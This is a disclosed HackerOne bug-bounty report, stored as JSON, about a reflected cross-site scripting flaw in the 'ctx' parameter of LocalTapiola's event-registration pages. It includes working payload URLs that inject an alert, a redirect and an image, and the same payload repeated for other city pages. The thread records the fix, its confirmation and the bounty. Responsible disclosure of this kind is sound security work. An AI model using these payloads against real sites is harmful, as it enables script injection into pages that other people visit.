{"id":201137,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDExMzc=","url":"https://hackerone.com/reports/201137","title":"Reflected XSS on iltakoulu_varkaus (viestinta.lahitapiola.fi)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-01-25T17:57:15.508Z","submitted_at":"2017-01-25T17:57:15.508Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yonm13","url":"/yonm13","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-03-06T13:53:51.710Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-04T13:53:29.844Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Basic report information\n**Summary:** The ctx parameter in http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus, can be exploited to perform an XSS Attack.\n\n**Description:** When a user fills the form in the webpage, a POST request is sent to the server with multiple parameters\n```\nPOST /webApp/iltakoulu_varkaus HTTP/1.1\nHost: viestinta.lahitapiola.fi\nContent-Length: 4700\nCache-Control: max-age=0\nOrigin: http://viestinta.lahitapiola.fi\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus\nAccept-Language: en-US,en;q=0.8\nCookie: AMCVS_8041A77B5656DBF07F000101%40AdobeOrg=1; AMCV_8041A77B5656DBF07F000101%40AdobeOrg=-227196251%7CMCIDTS%7C17190%7CMCMID%7C86390830056295906801442850595672988826%7CMCAAMLH-1485781637%7C6%7CMCAAMB-1485871297%7CNRX38WO0n5BH8Th-nqAG_A%7CMCOPTOUT-1485273697s%7CNONE%7CMCAID%7C2C3542A405309EB2-600003002000682B; s_sq=%5B%5BB%5D%5D; __utma=122060566.635463889.1485172763.1485266497.1485266697.3; __utmc=122060566; __utmz=122060566.1485266697.3.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmv=122060566.|2=Alueyhtio=Iisalmi=1; s_cc=true; uuid230=ba1a1122-1bfa-4b50-87e0-1f5c4b6cb74e; nlid=1e519fb|1c42278e; _ga=GA1.3.635463889.1485172763; ARCSessionInfo=39%7C1485172763414; _ga=GA1.2.635463889.1485172763; vlmref=131698714558516200; googtrans=/fi/en; googtrans=/fi/en\nConnection: close\n\nregistrationLocationId=464570262\u0026webAppLogRcpData_Etunimi=test\u0026webAppLogRcpData_Sukunimi=test\u0026webAppLogRcpData_Yrityksen_nimi_=Test2\u0026webAppLogRcpData_Toimiala=None\u0026webAppLogRcpData_Puhelinnumero=%2B197358661234\u0026webAppLogRcpData_Sahkoposti=tester%40test.com\u0026webAppLogRcpData_Postinumero_=12312333\u0026webAppLogRcpData_Erikoisruokavalio_laktoositon=1\u0026webAppLogRcpData_Erikoisruokavalio_muu=\u0026webAppLogRcpData_Yrityksen_koko=Yksinyritt%C3%A4j%C3%A4\u0026webAppLogRcpData_Kuinka_kauan_olet_toiminut_yrittajana__=yli+5+v\u0026webAppLogRcpData_Yrittajan_ika=alle+30+v\u0026webAppLogRcpData_Elon_asiakas=1\u0026webAppLogRcpData_Oletko_aikaisemmin_kaynyt_Yrittajan_Iltakoulussa_=Kyll%C3%A4\u0026webAppLogRcpData_Tietojani_saa_kayttaa=Ei+ollenkaan.\u0026webAppLogRcpData_Yhteystietojen_kaytto=Kyll%C3%A4\u0026webAppLogRcpData_Ennakkokysymys=%27\u0026webAppLogRcpData_Uutiskirjeentilaus=En\u0026ctx=%3Cctx+lang%3D%22en%22+_target%3D%22web%22+webApp-id%3D%2253976056%22+_folderModel%3D%22nmsRecipient%22+deliveryId%3D%22474097550%22%3E%3CuserInfo+xmlns%3ASOAP-ENV%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22+xmlns%3Ans%3D%22urn%3Axtk%3Asession%22+xmlns%3Axsd%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema%22+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22+datakitInDatabase%3D%22true%22+homeDir%3D%22%22+instanceLocale%3D%22en-US%22+locale%3D%22en-US%22+login%3D%22webapp%22+loginCS%3D%22Web+applications+agent+%28webapp%29%22+loginId%3D%223290%22+noConsoleCnx%3D%22true%22+orgUnitId%3D%220%22+theme%3D%22%22+timezone%3D%22Europe%2FHelsinki%22%3E%3Clogin-right+right%3D%22admin%22%2F%3E%3C%2FuserInfo%3E%3Ctimezone+current%3D%22Europe%2FHelsinki%22+changed%3D%22false%22%2F%3E%3Cvars%3E%3CerrorEmail%3E0%3C%2FerrorEmail%3E%3CregularFull%3E0%3C%2FregularFull%3E%3Ceventfull%3E0%3C%2Feventfull%3E%3Cheader%3Ehttp%3A%2F%2Fviestinta.lahitapiola.fi%2Fres%2Ftapiola%2F36d66e62aab33e26a6d6e968b1ce6193.jpg%3C%2Fheader%3E%3Cnoid%3E1%3C%2Fnoid%3E%3Csparebooking%3E0%3C%2Fsparebooking%3E%3CregisteredEmail%3E0%3C%2FregisteredEmail%3E%3Cotsikkoteksti%3E%26lt%3Binput+placeholder%3D%22%22+size%3D%220%22+value%3D%22464570262%22+id%3D%22registrationLocationId%22+name%3D%22registrationLocationId%22+class%3D%22%22+style%3D%22%22+type%3D%22hidden%22+onkeypress%3D%22var+_this%3Dthis%3Breturn+onEnterPressed%28event%2C+function%28%29%7Bdocument.controller.setValue%28%27%2Fctx%2Fvars%2FregistrationLocationId%27%2C+_this.value%2C+%27vars_registrationLocationId%27%29%3Breturn+true%3B%7D%29%3B%22+onblur%3D%22document.controller.setValue%28%27%2Fctx%2Fvars%2FregistrationLocationId%27%2C+this.value%2C+%27vars_registrationLocationId%27%29%22%2F%26gt%3B%26lt%3BH1+class%3Dhero%26gt%3BVarkaus%26lt%3B%2FH1%26gt%3B%26lt%3BP+class%3Dhero-info%26gt%3B01.03.+17%3A30+-+20%3A30%26lt%3B%2FP%26gt%3B%26lt%3BP+class%3Dhero-place%26gt%3BWarkaus-Sali%2C+Kauppatori+4%26lt%3B%2FP%26gt%3B%3C%2Fotsikkoteksti%3E%3Cpaikkakuntateksti%2F%3E%3Chtml%3E%26lt%3Bscript%26gt%3B%0D%0Afunction+initWebAppPage%28%29%0D%0A%7B%0D%0A%09document.controller.setValue%28%27%2Fctx%2Fvars%2FregistrationLocationId%27%2C+%27464570262%27%2C+%27vars_registrationLocationId%27%29%3B%0D%0A%7D%0D%0A%0D%0AjQuery%28function%28%29%0D%0A%7B%0D%0A%09initWebAppPage%28%29%3B%0D%0A%7D%29%3B%0D%0A%26lt%3B%2Fscript%26gt%3B%0D%0A%0D%0A%3C%2Fhtml%3E%3CregistrationLocationId%3E464570262%3C%2FregistrationLocationId%3E%3C%2Fvars%3E%3CactivityHistory%3E%3Cactivity+name%3D%22page%22%2F%3E%3Cactivity+name%3D%22test2%22%2F%3E%3Cactivity+name%3D%22script6%22%2F%3E%3Cactivity+name%3D%22script5%22%2F%3E%3Cactivity+name%3D%22script3%22%2F%3E%3Cactivity+name%3D%22prefill%22%2F%3E%3C%2FactivityHistory%3E%3CwebAppLogRcpData%3E%3CEtunimi%3Etest%3C%2FEtunimi%3E%3CSukunimi%3Etest%3C%2FSukunimi%3E%3CYrityksen_nimi_%3ETest2%3C%2FYrityksen_nimi_%3E%3CToimiala%3ENone%3C%2FToimiala%3E%3CPuhelinnumero%3E%2B197358661234%3C%2FPuhelinnumero%3E%3CSahkoposti%3Etester%40test.com%3C%2FSahkoposti%3E%3CPostinumero_%3E12312333%3C%2FPostinumero_%3E%3CErikoisruokavalio_laktoositon%3E1%3C%2FErikoisruokavalio_laktoositon%3E%3CYrityksen_koko%3EYksinyritt%C3%A4j%C3%A4%3C%2FYrityksen_koko%3E%3CKuinka_kauan_olet_toiminut_yrittajana__%3Eyli+5+v%3C%2FKuinka_kauan_olet_toiminut_yrittajana__%3E%3CYrittajan_ika%3Ealle+30+v%3C%2FYrittajan_ika%3E%3CElon_asiakas%3E1%3C%2FElon_asiakas%3E%3COletko_aikaisemmin_kaynyt_Yrittajan_Iltakoulussa_%3EKyll%C3%A4%3C%2FOletko_aikaisemmin_kaynyt_Yrittajan_Iltakoulussa_%3E%3CTietojani_saa_kayttaa%3EEi+ollenkaan.%3C%2FTietojani_saa_kayttaa%3E%3CYhteystietojen_kaytto%3EKyll%C3%A4%3C%2FYhteystietojen_kaytto%3E%3CEnnakkokysymys%3E%27%3C%2FEnnakkokysymys%3E%3CUutiskirjeentilaus%3EEn%3C%2FUutiskirjeentilaus%3E%3C%2FwebAppLogRcpData%3E%3C%2Fctx%3E\u0026userAction=next\u0026transition=\n```\n\nThe parameter \"HTML\" is translated directly into the Server's response, and can be abused to inject content into the page. \nThe request can be narrowed down, and translated into a GET request via a parameter named 'ctx'\ne.g:\nReflected XSS:\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e`\n\nJavascript Redirection (Wait for page to load):\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e%26lt%3bscript%26gt%3blocation.href%3d\"http%3a//google.com\"%3b%26lt%3b/script%26gt%3b\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e`\n\nIMG tag injection (at the end of the page):\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e\u003cimg+src%3d\"http%3a//i0.kym-cdn.com/photos/images/newsfeed/000/683/595/a36.jpg\"+/\u003e\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e`\n\n**Domain:** viestinta.lahitapiola.fi\n\n## Browsers / Apps Verified In:\n\n  All Browsers\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n  1. Access one of the URLs provided: (What seems like a bug in the Markdown's parsing mechanism was bypassed by adding a tailing '\u003e' to the URLs)\n       - [Javascript Alert](http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\u003e)\n       - [Google.com Redirection](http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e%26lt%3bscript%26gt%3blocation.href%3d\"http%3a//google.com\"%3b%26lt%3b/script%26gt%3b\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\u003e)\n       - [IMG Tag injection](http://viestinta.lahitapiola.fi/webApp/iltakoulu_varkaus?ctx=\u003cctx\u003e\u003cvars\u003e\u003chtml\u003e\u003cimg+src%3d\"http%3a//i0.kym-cdn.com/photos/images/newsfeed/000/683/595/a36.jpg\"+/\u003e\u003c/html\u003e\u003c/vars\u003e\u003cactivityHistory\u003e\u003cactivity+name%3d\"page\"/\u003e\u003cactivity+name%3d\"test2\"/\u003e\u003cactivity+name%3d\"script6\"/\u003e\u003cactivity+name%3d\"script5\"/\u003e\u003cactivity+name%3d\"script3\"/\u003e\u003cactivity+name%3d\"prefill\"/\u003e\u003c/activityHistory\u003e\u003c/ctx\u003e\u003e)\n\n## Additional material\n\n  * See attached POCs\n\n## Related reports, best practices\n\n  * [OWASP-recommendations]","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":155034,"file_name":"content_injection.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/155/034/9454497bd1cdaac1bba57260e276a3633ec1b2d5/content_injection.png?response-content-disposition=attachment%3B%20filename%3D%22content_injection.png%22%3B%20filename%2A%3DUTF-8%27%27content_injection.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRCOM766B%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140120Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQC2plSLprTu8RjGD8JYtZWBPt0cszlQG9FE345fmJX2hAIhALFlvJYKDzrEhN7%2FvlACW3w%2FuqitMoDByli%2BB32UD4xHKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igydotw%2BzjeVoEUzifsq1wO17iYJRnZ0fDCk2qA3GFkCAi2TACWamwiykehERisJcA6JAf5%2BKDXCSCA9Z5sJN1RS6yYikkzrd1g0%2FNHQvlKNEb%2F0bkFdpBo983pYtuPm%2FjZwdUmgycUkQTsKElvIdrra2ORU8syHUfTSsU0jkhKy1nTU1EUbOyVSpNZUO9kXRRe3ohujd32sjmj8LzGUv8aTvRQduIzkPVeEQOKzFH7EgJMvdNR3vaK2TDhSXjMkBaQKBFqnh6PEMyOLZDUpbrlIy%2BoEq2r%2B%2F10hoGkdsLCXXLTZ6FqEIiLpzSb0Iu7CYkr0MdHXUykD4DOTntKsy9rifi4r4BROm%2BFSV7DvWqgt3W4BdQyDDpqk1mezBTFX0MzxjgcpwKW8P9MAJbLCDmqfTTPFk4Q3hwN161Se85vO9XLNOyRVtPGBxj7OBbf9ALPJ5O3JeDoWAJMilj8zwYEUZ8HB%2BwxjDJ9XD8WIvUhkGyonPTYta41EE5Apa%2BuA9mDzlzHtztW9QWk0A9Sy6yWDe5RV1BvTfuQDIENmCujUYeHBAI1LctTr5dAfQfpbR25kBWiGSGkGj66CsyM%2Fv4WpFwB06OZt5%2FWKkqDvm8EJ4nRBeXyQEZgKwI6%2BBfR8uHZJrNaXh7ww%2FuiQiwY6pAG6PxCWeEgmj5NWNLAASGSJOsH%2B4v2Ym%2BQKqlIQLRYFFWUC%2FZOjX8OosfCA%2F2VoFSUqa9gE9u1ak8ebfBQMrD4qWG%2BNBuWtrVAT0zNhYQeLm7qYZBf6nK1%2F4Q%2FfiKY5Hwm5q1KG1XzDtwU7hRI5PfdeIVO1imHecmyw8jlgyE%2Bpn%2Bt6DW7WJdNcVKLCb%2BX4TDKDa3Lt%2FOx7FpCltN7n4hWkIyVpiw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=14efcbe6df1346458aeef33ea52e6c0a59d2ed4e9d1ff65e1ec18ffd3c41acd9","file_size":357415,"type":"image/png"},{"id":155035,"file_name":"reflected_xss.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/155/035/e9ac8ffc93c6ed745f3012f3b28a829dffb937d1/reflected_xss.png?response-content-disposition=attachment%3B%20filename%3D%22reflected_xss.png%22%3B%20filename%2A%3DUTF-8%27%27reflected_xss.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRCOM766B%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140120Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQC2plSLprTu8RjGD8JYtZWBPt0cszlQG9FE345fmJX2hAIhALFlvJYKDzrEhN7%2FvlACW3w%2FuqitMoDByli%2BB32UD4xHKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igydotw%2BzjeVoEUzifsq1wO17iYJRnZ0fDCk2qA3GFkCAi2TACWamwiykehERisJcA6JAf5%2BKDXCSCA9Z5sJN1RS6yYikkzrd1g0%2FNHQvlKNEb%2F0bkFdpBo983pYtuPm%2FjZwdUmgycUkQTsKElvIdrra2ORU8syHUfTSsU0jkhKy1nTU1EUbOyVSpNZUO9kXRRe3ohujd32sjmj8LzGUv8aTvRQduIzkPVeEQOKzFH7EgJMvdNR3vaK2TDhSXjMkBaQKBFqnh6PEMyOLZDUpbrlIy%2BoEq2r%2B%2F10hoGkdsLCXXLTZ6FqEIiLpzSb0Iu7CYkr0MdHXUykD4DOTntKsy9rifi4r4BROm%2BFSV7DvWqgt3W4BdQyDDpqk1mezBTFX0MzxjgcpwKW8P9MAJbLCDmqfTTPFk4Q3hwN161Se85vO9XLNOyRVtPGBxj7OBbf9ALPJ5O3JeDoWAJMilj8zwYEUZ8HB%2BwxjDJ9XD8WIvUhkGyonPTYta41EE5Apa%2BuA9mDzlzHtztW9QWk0A9Sy6yWDe5RV1BvTfuQDIENmCujUYeHBAI1LctTr5dAfQfpbR25kBWiGSGkGj66CsyM%2Fv4WpFwB06OZt5%2FWKkqDvm8EJ4nRBeXyQEZgKwI6%2BBfR8uHZJrNaXh7ww%2FuiQiwY6pAG6PxCWeEgmj5NWNLAASGSJOsH%2B4v2Ym%2BQKqlIQLRYFFWUC%2FZOjX8OosfCA%2F2VoFSUqa9gE9u1ak8ebfBQMrD4qWG%2BNBuWtrVAT0zNhYQeLm7qYZBf6nK1%2F4Q%2FfiKY5Hwm5q1KG1XzDtwU7hRI5PfdeIVO1imHecmyw8jlgyE%2Bpn%2Bt6DW7WJdNcVKLCb%2BX4TDKDa3Lt%2FOx7FpCltN7n4hWkIyVpiw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4deb4ddfb14f27a4695fd036908fd371044cdaf79ebca27113be0f6968443423","file_size":649981,"type":"image/png"}],"allow_singular_disclosure_at":"2017-03-06T13:53:29.883Z","allow_singular_disclosure_after":-145152470.5607544,"singular_disclosure_allowed":true,"vote_count":3,"voters":["delimitry","eveeez","spetr0x"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1443829,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\n\n*Note: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report*","automated_response":false,"created_at":"2017-01-25T18:47:27.433Z","updated_at":"2017-01-25T18:47:27.433Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1443897,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your response. \nAfter submitting the issue I had noticed that this is a recurring vulnerability, available on multiple similar events. These can be accessed by changing the city name in the URL\ne.g.:\nkokkola:\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_kokkola?ctx=%3Cctx%3E%3Cvars%3E%3Chtml%3E%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b%3C/html%3E%3C/vars%3E%3CactivityHistory%3E%3Cactivity+name%3d%22page%22/%3E%3Cactivity+name%3d%22test2%22/%3E%3Cactivity+name%3d%22script6%22/%3E%3Cactivity+name%3d%22script5%22/%3E%3Cactivity+name%3d%22script3%22/%3E%3Cactivity+name%3d%22prefill%22/%3E%3C/activityHistory%3E%3C/ctx%3E`\n\nturku:\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_turku?ctx=%3Cctx%3E%3Cvars%3E%3Chtml%3E%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b%3C/html%3E%3C/vars%3E%3CactivityHistory%3E%3Cactivity+name%3d%22page%22/%3E%3Cactivity+name%3d%22test2%22/%3E%3Cactivity+name%3d%22script6%22/%3E%3Cactivity+name%3d%22script5%22/%3E%3Cactivity+name%3d%22script3%22/%3E%3Cactivity+name%3d%22prefill%22/%3E%3C/activityHistory%3E%3C/ctx%3E`\n\nhelsinki:\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu_helsinki?ctx=%3Cctx%3E%3Cvars%3E%3Chtml%3E%26lt%3bscript%26gt%3balert();%3b%26lt%3b/script%26gt%3b%3C/html%3E%3C/vars%3E%3CactivityHistory%3E%3Cactivity+name%3d%22page%22/%3E%3Cactivity+name%3d%22test2%22/%3E%3Cactivity+name%3d%22script6%22/%3E%3Cactivity+name%3d%22script5%22/%3E%3Cactivity+name%3d%22script3%22/%3E%3Cactivity+name%3d%22prefill%22/%3E%3C/activityHistory%3E%3C/ctx%3E`\n\netc.\nThe list of available cities can be acquired from here:\n`http://viestinta.lahitapiola.fi/webApp/iltakoulu`\n\n","automated_response":false,"created_at":"2017-01-25T19:12:20.236Z","updated_at":"2017-01-25T19:12:20.236Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1444732,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @yonm13 could you verify that these are now properly fixed?","automated_response":false,"created_at":"2017-01-26T06:45:02.028Z","updated_at":"2017-01-26T06:45:02.028Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1444733,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2017-01-26T06:45:15.809Z","updated_at":"2017-01-26T06:45:15.809Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1444760,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Yes, they all appear to be fixed; \nPOST requests now ignore the 'ctx' variable completely, while GET requests insert its contents into a `parseXMLString` Javascript function. The provided content appears to be properly sanitized against context escape (the same mechanism is implemented successfuly on other forms in this domain).","automated_response":false,"created_at":"2017-01-26T07:27:32.212Z","updated_at":"2017-01-26T07:27:32.212Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1459823,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you - especially for not making each and every URL a separate report I added a bonus.","automated_response":false,"created_at":"2017-02-02T23:06:08.931Z","updated_at":"2017-02-02T23:06:08.931Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"yonm13","url":"/yonm13"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1459824,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Public disclosure OK?","automated_response":false,"created_at":"2017-02-02T23:06:34.347Z","updated_at":"2017-02-02T23:06:34.347Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"yonm13","url":"/yonm13"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1459832,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure. Thank you! ","automated_response":false,"created_at":"2017-02-02T23:08:36.797Z","updated_at":"2017-02-02T23:08:36.797Z","actor":{"username":"yonm13","cleared":false,"url":"/yonm13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1462739,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Public 